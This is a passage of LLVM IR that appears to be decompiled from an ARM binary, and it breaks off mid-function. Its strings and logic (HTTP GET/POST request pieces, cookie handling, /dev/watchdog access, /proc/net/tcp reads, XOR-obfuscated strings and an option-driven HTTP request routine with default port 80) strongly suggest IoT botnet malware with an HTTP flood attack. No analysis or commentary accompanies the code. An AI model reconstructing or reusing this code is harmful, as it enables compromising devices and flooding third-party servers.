source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_de9c.14 = constant i32 -382906384
@global_var_159bc.17 = constant [4 x i8] c"GET\00"
@global_var_159c0.19 = constant i32 47
@global_var_10608.22 = constant i32 -382910336
@global_var_159b4.24 = constant i32 32
@global_var_1598c.26 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_159a4.28 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_159b0.30 = constant [3 x i8] c"\0D\0A\00"
@global_var_159c4.32 = constant [9 x i8] c"Cookie: \00"
@global_var_159d0.34 = constant [3 x i8] c"; \00"
@global_var_159dc.36 = constant i32 59
@global_var_159d4.38 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_159e0.40 = constant [5 x i8] c"http\00"
@global_var_159e8.42 = constant [5 x i8] c"url=\00"
@global_var_159f0.44 = constant [5 x i8] c"POST\00"
@global_var_159f8.46 = constant i32 39
@global_var_f964.47 = constant i32 -439279616
@global_var_159fc.49 = constant i32 61
@global_var_1e5b4.53 = global i32 0
@global_var_a06c.54 = constant i32 -352321547
@global_var_120a4.55 = constant i32 -382909968
@global_var_1e5b1.59 = global i32 0
@global_var_c81c.61 = constant i32 -382906384
@global_var_c170.63 = constant i32 -382906384
@global_var_ba78.65 = constant i32 -382906384
@global_var_b2c4.67 = constant i32 -382906384
@global_var_aca8.69 = constant i32 -382906384
@global_var_a614.71 = constant i32 -382906384
@global_var_8190.73 = constant i32 -382906384
@global_var_20600.75 = global i32 0
@global_var_15a00.82 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_20608.85 = global i32 0
@global_var_1e5b8.87 = global i32 0
@global_var_20604.89 = global i32 0
@global_var_103d4.91 = constant i32 -382910336
@global_var_de18.93 = constant i32 -382910352
@global_var_20610.100 = local_unnamed_addr global i32 0
@global_var_2060e.101 = local_unnamed_addr global i32 0
@global_var_15a10.104 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_15a64.110 = constant [3 x i8] c"/.\00"
@global_var_f00c.117 = constant i32 -442552176
@global_var_d550.121 = constant i32 -382906384
@global_var_15a60.122 = constant i32 56476
@global_var_15a34.125 = constant i32 10
@global_var_15a20.127 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_e7c4.130 = constant i32 123884
@global_var_15a38.137 = constant i32 16777216
@global_var_1e5c0.139 = global i32 0
@global_var_1e5cc.141 = global i32 0
@global_var_1e5c4.143 = global i32 0
@global_var_1e5c8.145 = global i32 0
@global_var_15a78.151 = constant [33 x i8] c"7cliftvqm1ugnkbej08owar2phd35s64\00"
@global_var_ef00.161 = constant i32 -509607925
@global_var_2061c.163 = global i32 0
@global_var_15a9c.169 = constant i32 1326272261
@global_var_20634.171 = local_unnamed_addr global i32 0
@global_var_20638.172 = local_unnamed_addr global i32 0
@global_var_15aac.174 = constant [3 x i8] c"m?\00"
@global_var_2063c.175 = local_unnamed_addr global i32 0
@global_var_20640.176 = local_unnamed_addr global i32 0
@global_var_206ac.177 = local_unnamed_addr global i32 0
@global_var_206b0.178 = local_unnamed_addr global i32 0
@global_var_15ab0.180 = constant i32 34777
@global_var_206b4.181 = local_unnamed_addr global i32 0
@global_var_206b8.182 = local_unnamed_addr global i32 0
@global_var_15ab4.184 = constant i32 370215694
@global_var_2062c.185 = local_unnamed_addr global i32 0
@global_var_20630.186 = local_unnamed_addr global i32 0
@global_var_15cf0.188 = constant i32 303437322
@global_var_20644.189 = local_unnamed_addr global i32 0
@global_var_20648.190 = local_unnamed_addr global i32 0
@global_var_15ac0.192 = constant i32 219157069
@global_var_2064c.193 = local_unnamed_addr global i32 0
@global_var_20650.194 = local_unnamed_addr global i32 0
@global_var_15ac8.196 = constant i32 119146317
@global_var_20658.197 = local_unnamed_addr global i32 0
@global_var_20654.198 = local_unnamed_addr global i32 0
@global_var_15ad0.200 = constant i32 235341386
@global_var_2065c.201 = local_unnamed_addr global i32 0
@global_var_20660.202 = local_unnamed_addr global i32 0
@global_var_15adc.204 = constant i32 1644561485
@global_var_20664.205 = local_unnamed_addr global i32 0
@global_var_20668.206 = local_unnamed_addr global i32 0
@global_var_15ae4.208 = constant i32 185336652
@global_var_2066c.209 = local_unnamed_addr global i32 0
@global_var_20670.210 = local_unnamed_addr global i32 0
@global_var_15aec.212 = constant i32 51777869
@global_var_20674.213 = local_unnamed_addr global i32 0
@global_var_20678.214 = local_unnamed_addr global i32 0
@global_var_15af8.216 = constant i32 758261552
@global_var_20680.217 = local_unnamed_addr global i32 0
@global_var_2067c.218 = local_unnamed_addr global i32 0
@global_var_15b08.220 = constant [11 x i8] c"*662$.--&b\00"
@global_var_20684.221 = local_unnamed_addr global i32 0
@global_var_20688.222 = local_unnamed_addr global i32 0
@global_var_15b14.224 = constant [11 x i8] c".-.,-%6$-b\00"
@global_var_2068c.225 = local_unnamed_addr global i32 0
@global_var_20690.226 = local_unnamed_addr global i32 0
@global_var_15b20.228 = constant i32 1515395646
@global_var_20694.229 = local_unnamed_addr global i32 0
@global_var_20698.230 = local_unnamed_addr global i32 0
@global_var_15b44.232 = constant i32 235801880
@global_var_2069c.233 = local_unnamed_addr global i32 0
@global_var_206a0.234 = local_unnamed_addr global i32 0
@global_var_15b50.236 = constant [12 x i8] c"%'6.-!#.+2b\00"
@global_var_206a4.237 = local_unnamed_addr global i32 0
@global_var_206a8.238 = local_unnamed_addr global i32 0
@global_var_15b5c.240 = constant i32 235342353
@global_var_206c0.241 = local_unnamed_addr global i32 0
@global_var_206bc.242 = local_unnamed_addr global i32 0
@global_var_15d10.244 = constant i32 199687
@global_var_206c4.245 = local_unnamed_addr global i32 0
@global_var_206c8.246 = local_unnamed_addr global i32 0
@global_var_15b64.248 = constant i32 370219793
@global_var_206cc.249 = local_unnamed_addr global i32 0
@global_var_206d0.250 = local_unnamed_addr global i32 0
@global_var_15b6c.252 = constant i32 6425105
@global_var_206d4.253 = local_unnamed_addr global i32 0
@global_var_206d8.254 = local_unnamed_addr global i32 0
@global_var_15d18.256 = constant i32 202047565
@global_var_206e0.257 = local_unnamed_addr global i32 0
@global_var_206dc.258 = local_unnamed_addr global i32 0
@global_var_15b70.260 = constant i32 590359343
@global_var_206e4.261 = local_unnamed_addr global i32 0
@global_var_206e8.262 = local_unnamed_addr global i32 0
@global_var_15b8c.264 = constant i32 269287692
@global_var_206ec.265 = local_unnamed_addr global i32 0
@global_var_206f0.266 = local_unnamed_addr global i32 0
@global_var_15d2c.268 = constant i32 202047565
@global_var_206f4.269 = local_unnamed_addr global i32 0
@global_var_206f8.270 = local_unnamed_addr global i32 0
@global_var_15d40.272 = constant i32 202047565
@global_var_20700.273 = local_unnamed_addr global i32 0
@global_var_206fc.274 = local_unnamed_addr global i32 0
@global_var_15b98.276 = constant i32 386740534
@global_var_20704.277 = local_unnamed_addr global i32 0
@global_var_20708.278 = local_unnamed_addr global i32 0
@global_var_15bb0.280 = constant i32 18220877
@global_var_20710.281 = local_unnamed_addr global i32 0
@global_var_2070c.282 = local_unnamed_addr global i32 0
@global_var_15bc4.284 = constant i32 118424332
@global_var_20714.285 = local_unnamed_addr global i32 0
@global_var_20718.286 = local_unnamed_addr global i32 0
@global_var_15bd4.288 = constant i32 202116385
@global_var_2071c.289 = local_unnamed_addr global i32 0
@global_var_15d58.291 = constant i32 117506339
@global_var_20724.292 = local_unnamed_addr global i32 0
@global_var_15bec.294 = constant i32 117506339
@global_var_2072c.295 = local_unnamed_addr global i32 0
@global_var_15c10.297 = constant i32 369888545
@global_var_20734.298 = local_unnamed_addr global i32 0
@global_var_15c44.300 = constant i32 555091729
@global_var_2073c.301 = local_unnamed_addr global i32 0
@global_var_15c54.303 = constant i32 268699408
@global_var_20744.304 = local_unnamed_addr global i32 0
@global_var_15c60.306 = constant i32 50400526
@global_var_2074c.307 = local_unnamed_addr global i32 0
@global_var_15c6c.309 = constant i32 1326843665
@global_var_20754.310 = local_unnamed_addr global i32 0
@global_var_15c7c.312 = constant i32 369888513
@global_var_2075c.313 = local_unnamed_addr global i32 0
@global_var_15c90.315 = constant i32 201527318
@global_var_20764.316 = local_unnamed_addr global i32 0
@global_var_15ca4.318 = constant i32 202836481
@global_var_2076c.319 = local_unnamed_addr global i32 0
@global_var_15be0.321 = constant i32 302450441
@global_var_20774.322 = local_unnamed_addr global i32 0
@global_var_15cb0.324 = constant i32 202116353
@global_var_2077c.325 = local_unnamed_addr global i32 0
@global_var_15cc0.327 = constant i32 336594705
@global_var_20784.328 = local_unnamed_addr global i32 0
@global_var_15cd4.330 = constant i32 336594705
@global_var_2078c.331 = local_unnamed_addr global i32 0
@global_var_15dac.333 = constant i32 186125615
@global_var_20794.334 = local_unnamed_addr global i32 0
@global_var_15e1c.336 = constant i32 186125615
@global_var_2079c.337 = local_unnamed_addr global i32 0
@global_var_15e8c.339 = constant i32 186125615
@global_var_207a4.340 = local_unnamed_addr global i32 0
@global_var_15efc.342 = constant i32 186125615
@global_var_207ac.343 = local_unnamed_addr global i32 0
@global_var_15f6c.345 = constant i32 186125615
@global_var_207b4.346 = local_unnamed_addr global i32 0
@global_var_106cc.352 = constant i32 -443088884
@global_var_d934.368 = constant [3 x i8] c"A\0A\00"
@global_var_1e5ec.370 = global i32 0
@global_var_10afc.372 = constant i32 -456978431
@global_var_11094.390 = constant i32 -478871519
@global_var_11b14.404 = constant i32 -478805983
@global_var_11ef0.413 = constant i32 -382906384
@global_var_1e5d0.421 = local_unnamed_addr global i32 0
@global_var_13978.423 = constant i32 -509591552
@global_var_bd20.427 = constant i32 -494075856
@global_var_1e5d4.433 = local_unnamed_addr global i32 0
@global_var_143ac.436 = constant i32 -382909968
@global_var_12750.437 = constant i32 -494075872
@global_var_105d0.438 = constant i32 -382910336
@global_var_bbb8.441 = constant i32 -443744204
@global_var_15ffc.443 = constant [11 x i8] c"/proc/stat\00"
@global_var_16008.448 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_16018.450 = constant [10 x i8] c"processor\00"
@global_var_1603c.452 = constant i32 604672
@global_var_12910.455 = constant i32 -369098421
@global_var_1e5e4.468 = local_unnamed_addr global i32 0
@global_var_1e5e8.470 = local_unnamed_addr global i32 0
@global_var_16040.473 = constant [10 x i8] c"/dev/null\00"
@global_var_12320.474 = constant i32 -442543860
@global_var_14310.479 = constant i32 -382910352
@global_var_10b30.484 = constant i32 -369094626
@global_var_132dc.497 = constant i32 -335545128
@global_var_137a4.503 = constant i32 -382909456
@global_var_205fc.506 = local_unnamed_addr global i32 0
@global_var_16020.514 = constant i32 114
@global_var_147d0.519 = constant i32 -382906384
@global_var_20003.528 = global i32 0
@global_var_20000.529 = global i32 0
@global_var_142b0.539 = constant i32 -509607926
@global_var_1634c.544 = constant i32 0
@global_var_15768.545 = constant i32 -382909968
@global_var_145f4.555 = constant i32 -509607928
@global_var_1e594.2 = external global i8*
@global_var_1e5b0.51 = external global i8*
@1 = internal constant [4 x i8] c"\F4\E3\01\00"
@global_var_2060c.99 = global i16* null
@global_var_1e5bc.132 = external global i8*

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_8098)
  %v31_80a0 = load i32, i32* @r0, align 4
  ret i32 %v31_80a0
}

define i32 @function_80b0() local_unnamed_addr {
entry:
  store i32 ptrtoint (i8** @global_var_1e594.2 to i32), i32* @r4, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_1e594.2 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %dec_label_pc_80c4, label %dec_label_pc_80e0

dec_label_pc_80c4:                                ; preds = %entry
  store i1 true, i1* @cpsr_z, align 1
  %v3_80d4 = call i32 @function_80ec()
  %v2_80dc = load i32, i32* @r4, align 4
  %v3_80dc = inttoptr i32 %v2_80dc to i8*
  store i8 1, i8* %v3_80dc, align 1
  br label %dec_label_pc_80e0

dec_label_pc_80e0:                                ; preds = %entry, %dec_label_pc_80c4
  %.0 = phi i32 [ %v3_80d4, %dec_label_pc_80c4 ], [ undef, %entry ]
  ret i32 %.0

; uselistorder directives
  uselistorder i8** @global_var_1e594.2, { 1, 0 }
  uselistorder label %dec_label_pc_80e0, { 1, 0 }
}

define i32 @function_80ec() local_unnamed_addr {
dec_label_pc_80ec:
  %v0_80f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_80f0, label %bb, label %dec_label_pc_80ec._crit_edge

dec_label_pc_80ec._crit_edge:                     ; preds = %dec_label_pc_80ec
  br label %bb4

bb:                                               ; preds = %dec_label_pc_80ec
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_80ec._crit_edge, %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8118 = load i32, i32* inttoptr (i32 123760 to i32*), align 16
  %v2_811c = icmp eq i32 %v2_8118, 0
  br i1 %v2_811c, label %dec_label_pc_8134, label %dec_label_pc_8124

dec_label_pc_8124:                                ; preds = %bb4
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8134

dec_label_pc_8134:                                ; preds = %bb4, %dec_label_pc_8124
  ret i32 123760

; uselistorder directives
  uselistorder label %dec_label_pc_8134, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_815c = ptrtoint i32* %stack_var_4 to i32
  %v8_817c = call i32 @function_1304c(i32 ptrtoint (i32* @global_var_de9c.14 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 88428, i32 %arg1, i32 %v4_815c)
  %v0_8180 = call i32 @function_12320()
  ret i32 %v0_8180
}

define i32 @function_8190(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8190:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-10572 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-20813 = alloca i32, align 4
  %v3_8190 = load i32, i32* @r4, align 4
  %v6_8190 = load i32, i32* @r5, align 4
  %v18_8190 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_81bc = inttoptr i32 %arg4 to i32*
  %v6_81bc = call i32 @function_9f20(i32 %arg3, i32* %v5_81bc, i32 21, i32 0, i32 %arg2)
  %v0_81c0 = load i32, i32* @r5, align 4
  store i32 %v0_81c0, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v0_81cc = load i32, i32* @r4, align 4
  store i32 %v0_81cc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_159bc.17 to i32), i32* %r3.global-to-local, align 4
  %v6_81d4 = inttoptr i32 %v0_81c0 to i32*
  %v7_81d4 = call i32 @function_9f20(i32 %v0_81cc, i32* %v6_81d4, i32 20, i32 ptrtoint ([4 x i8]* @global_var_159bc.17 to i32), i32 %v6_81bc)
  %v0_81d8 = load i32, i32* @r5, align 4
  store i32 %v0_81d8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_81d4, i32* @sb, align 4
  %v0_81e8 = load i32, i32* @r4, align 4
  store i32 %v0_81e8, i32* %r0.global-to-local, align 4
  %v5_81ec = inttoptr i32 %v0_81d8 to i32*
  %v6_81ec = call i32 @function_9f20(i32 %v0_81e8, i32* %v5_81ec, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_81f0 = load i32, i32* @r5, align 4
  store i32 %v0_81f0, i32* %r1.global-to-local, align 4
  store i32 %v6_81ec, i32* @sl, align 4
  store i32 22, i32* %r2.global-to-local, align 4
  %v0_81fc = load i32, i32* @r4, align 4
  store i32 %v0_81fc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_159c0.19 to i32), i32* %r3.global-to-local, align 4
  %v5_8204 = inttoptr i32 %v0_81f0 to i32*
  %v6_8204 = call i32 @function_9f20(i32 %v0_81fc, i32* %v5_8204, i32 22, i32 ptrtoint (i32* @global_var_159c0.19 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8208 = load i32, i32* @r5, align 4
  store i32 %v0_8208, i32* %r1.global-to-local, align 4
  store i32 %v6_8204, i32* @r8, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_8214 = load i32, i32* @r4, align 4
  store i32 %v0_8214, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_821c = inttoptr i32 %v0_8208 to i32*
  %v5_821c = call i32 @function_a300(i32 %v0_8214, i32* %v4_821c, i32 24, i32 1)
  %v0_8220 = load i32, i32* @r5, align 4
  store i32 %v0_8220, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_821c, i32* @r6, align 4
  %v0_8230 = load i32, i32* @r4, align 4
  store i32 %v0_8230, i32* %r0.global-to-local, align 4
  %v4_8234 = inttoptr i32 %v0_8220 to i32*
  %v5_8234 = call i32 @function_a300(i32 %v0_8230, i32* %v4_8234, i32 7, i32 80)
  %v2_823c = ptrtoint i32* %stack_var_-20813 to i32
  %v3_8244 = mul i32 %v5_8234, 65536
  store i32 %v3_8244, i32* %r3.global-to-local, align 4
  %tmp168 = bitcast i32* %stack_var_-20813 to i8*
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  store i32 10241, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8258 = urem i32 %v5_8234, 65536
  store i32 %v3_8258, i32* @r7, align 4
  %v3_825c = call i32 @function_10a80(i8* %tmp168, i32 0)
  store i32 %v3_825c, i32* %r0.global-to-local, align 4
  %v0_8260 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8260 = icmp eq i32 %v0_8260, 0
  store i1 %v2_8260, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8260, label %.thread14, label %bb

bb:                                               ; preds = %dec_label_pc_8190
  %v1_8264 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_8264 = icmp eq i32 %v1_8264, 0
  store i1 %v3_8264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8264, label %bb169, label %dec_label_pc_8284

.thread14:                                        ; preds = %dec_label_pc_8190
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8274

bb169:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8274

dec_label_pc_8274:                                ; preds = %bb169, %dec_label_pc_82a4, %.thread14, %dec_label_pc_8294, %dec_label_pc_8284
  %v1_8280 = phi i32 [ %v2_82a8, %dec_label_pc_82a4 ], [ %v3_825c, %.thread14 ], [ %v3_825c, %bb169 ], [ %v2_8298, %dec_label_pc_8294 ], [ %v2_8288, %dec_label_pc_8284 ]
  store i32 %v3_8190, i32* %r4.global-to-local, align 4
  store i32 %v6_8190, i32* %r5.global-to-local, align 4
  store i32 %v18_8190, i32* %sb.global-to-local, align 4
  ret i32 %v1_8280

dec_label_pc_8284:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_8260, i32* %r0.global-to-local, align 4
  %v1_8288 = inttoptr i32 %v0_8260 to i8*
  %v2_8288 = call i32 @function_f93c(i8* %v1_8288)
  store i32 %v2_8288, i32* %r0.global-to-local, align 4
  %v2_828c = icmp ugt i32 %v2_8288, 254
  store i1 %v2_828c, i1* %cpsr_c.global-to-local, align 1
  %v7_828c = icmp eq i32 %v2_8288, 255
  store i1 %v7_828c, i1* %cpsr_z.global-to-local, align 1
  %v8_8290 = icmp sgt i32 %v2_8288, 255
  br i1 %v8_8290, label %dec_label_pc_8274, label %dec_label_pc_8294

dec_label_pc_8294:                                ; preds = %dec_label_pc_8284
  %v0_8294 = load i32, i32* @sl, align 4
  store i32 %v0_8294, i32* %r0.global-to-local, align 4
  %v1_8298 = inttoptr i32 %v0_8294 to i8*
  %v2_8298 = call i32 @function_f93c(i8* %v1_8298)
  store i32 %v2_8298, i32* %r0.global-to-local, align 4
  %v2_829c = icmp ugt i32 %v2_8298, 126
  store i1 %v2_829c, i1* %cpsr_c.global-to-local, align 1
  %v7_829c = icmp eq i32 %v2_8298, 127
  store i1 %v7_829c, i1* %cpsr_z.global-to-local, align 1
  %v8_82a0 = icmp sgt i32 %v2_8298, 127
  br i1 %v8_82a0, label %dec_label_pc_8274, label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8294
  %v0_82a4 = load i32, i32* @sb, align 4
  store i32 %v0_82a4, i32* %r0.global-to-local, align 4
  %v1_82a8 = inttoptr i32 %v0_82a4 to i8*
  %v2_82a8 = call i32 @function_f93c(i8* %v1_82a8)
  store i32 %v2_82a8, i32* %r0.global-to-local, align 4
  %v2_82ac = icmp ugt i32 %v2_82a8, 8
  store i1 %v2_82ac, i1* %cpsr_c.global-to-local, align 1
  %v7_82ac = icmp eq i32 %v2_82a8, 9
  store i1 %v7_82ac, i1* %cpsr_z.global-to-local, align 1
  %v7_82b0 = icmp sgt i32 %v2_82a8, 9
  br i1 %v7_82b0, label %dec_label_pc_8274, label %bb170

bb170:                                            ; preds = %dec_label_pc_82a4
  %v10_82b0 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  %v8_82b4 = load i32, i32* @r4, align 4
  %v10_82b4 = add i32 %v10_82b0, 364
  %v11_82b4 = inttoptr i32 %v10_82b4 to i32*
  store i32 %v8_82b4, i32* %v11_82b4, align 4
  br label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %bb170, %bb174
  %v0_82bc = load i32, i32* @sb, align 4
  store i32 %v0_82bc, i32* %r0.global-to-local, align 4
  %v1_82c0 = inttoptr i32 %v0_82bc to i8*
  %v2_82c0 = call i32 @function_f93c(i8* %v1_82c0)
  store i32 %v2_82c0, i32* %r0.global-to-local, align 4
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_82c8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_82c8, i32* %ip.global-to-local, align 4
  %v3_82cc = icmp uge i32 %v2_82c0, %v3_82c8
  store i1 %v3_82cc, i1* %cpsr_c.global-to-local, align 1
  %v9_82cc = icmp eq i32 %v2_82c0, %v3_82c8
  store i1 %v9_82cc, i1* %cpsr_z.global-to-local, align 1
  %v7_82d0 = icmp sgt i32 %v2_82c0, %v3_82c8
  br i1 %v7_82d0, label %dec_label_pc_82d4, label %dec_label_pc_8300

dec_label_pc_82d4:                                ; preds = %dec_label_pc_82bc
  %v0_82d4 = load i32, i32* @sb, align 4
  %v2_82d4 = add i32 %v0_82d4, %v3_82c8
  %v3_82d4 = inttoptr i32 %v2_82d4 to i8*
  %v4_82d4 = load i8, i8* %v3_82d4, align 1
  %v6_82d4 = zext i8 %v4_82d4 to i32
  %v1_82d8 = add nsw i32 %v6_82d4, -32
  store i32 %v1_82d8, i32* %r2.global-to-local, align 4
  %v1_82dc = add nsw i32 %v6_82d4, -97
  store i32 %v1_82dc, i32* %r3.global-to-local, align 4
  %v2_82e0 = icmp ugt i32 %v1_82dc, 24
  store i1 %v2_82e0, i1* %cpsr_c.global-to-local, align 1
  %v7_82e0 = icmp eq i32 %v1_82dc, 25
  store i1 %v7_82e0, i1* %cpsr_z.global-to-local, align 1
  %v2_82e4 = xor i1 %v2_82e0, true
  %v3_82e4 = or i1 %v7_82e0, %v2_82e4
  br i1 %v3_82e4, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_82d4
  %v5_82e4 = trunc i32 %v1_82d8 to i8
  store i8 %v5_82e4, i8* %v3_82d4, align 1
  %v0_82e8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_82e8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb172

bb172:                                            ; preds = %dec_label_pc_82d4, %bb171
  %v1_82ec = phi i1 [ %v2_82e0, %dec_label_pc_82d4 ], [ %v1_82e8.pre, %bb171 ]
  %v0_82ec = phi i1 [ false, %dec_label_pc_82d4 ], [ %v0_82e8.pre, %bb171 ]
  %v2_82e8 = xor i1 %v1_82ec, true
  %v3_82e8 = or i1 %v0_82ec, %v2_82e8
  br i1 %v3_82e8, label %bb173, label %._crit_edge

._crit_edge:                                      ; preds = %bb172
  %v0_82f4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb174

bb173:                                            ; preds = %bb172
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v7_82ec = load i32, i32* %v11_82b4, align 4
  store i32 %v7_82ec, i32* %ip.global-to-local, align 4
  br label %bb174

bb174:                                            ; preds = %._crit_edge, %bb173
  %v0_82f4 = phi i32 [ %v0_82f4.pre, %._crit_edge ], [ %v7_82ec, %bb173 ]
  store i32 %v10_82b0, i32* @lr, align 4
  %v1_82f4 = add i32 %v0_82f4, 1
  store i32 %v1_82f4, i32* %ip.global-to-local, align 4
  store i32 %v1_82f4, i32* %stack_var_-44, align 4
  br label %dec_label_pc_82bc

dec_label_pc_8300:                                ; preds = %dec_label_pc_82bc
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_8304 = call i32 @function_f0ac(i32 36)
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_830c = call i32 @function_f0ac(i32 37)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_8314 = call i32 @function_f0ac(i32 38)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_831c = call i32 @function_f0ac(i32 39)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_8324 = call i32 @function_f0ac(i32 40)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_832c = call i32 @function_f0ac(i32 41)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_8334 = call i32 @function_f0ac(i32 42)
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_833c = call i32 @function_f0ac(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_8344 = call i32 @function_f0ac(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_834c = call i32 @function_f0ac(i32 45)
  store i32 %v1_834c, i32* %r0.global-to-local, align 4
  %v0_8350 = load i32, i32* @r6, align 4
  %v3_8350 = icmp ugt i32 %v0_8350, 255
  store i1 %v3_8350, i1* %cpsr_c.global-to-local, align 1
  %v8_8350 = icmp eq i32 %v0_8350, 256
  store i1 %v8_8350, i1* %cpsr_z.global-to-local, align 1
  %v5_8354 = icmp slt i32 %v0_8350, 256
  br i1 %v5_8354, label %thread-pre-split, label %bb175

bb175:                                            ; preds = %dec_label_pc_8300
  store i32 256, i32* @r6, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_8300, %bb175
  %v0_835c = phi i32 [ 256, %bb175 ], [ %v0_8350, %dec_label_pc_8300 ]
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_8360 = call i32 @function_f0ac(i32 46)
  store i32 %v0_835c, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_8370 = call i32 @function_11958(i32 %v0_835c, i32 3140)
  store i32 %v2_8370, i32* %r0.global-to-local, align 4
  store i32 %v0_835c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8378 = icmp eq i32 %v0_835c, 0
  store i1 %v2_8378, i1* %cpsr_z.global-to-local, align 1
  %tmp176 = icmp slt i32 %v0_835c, 1
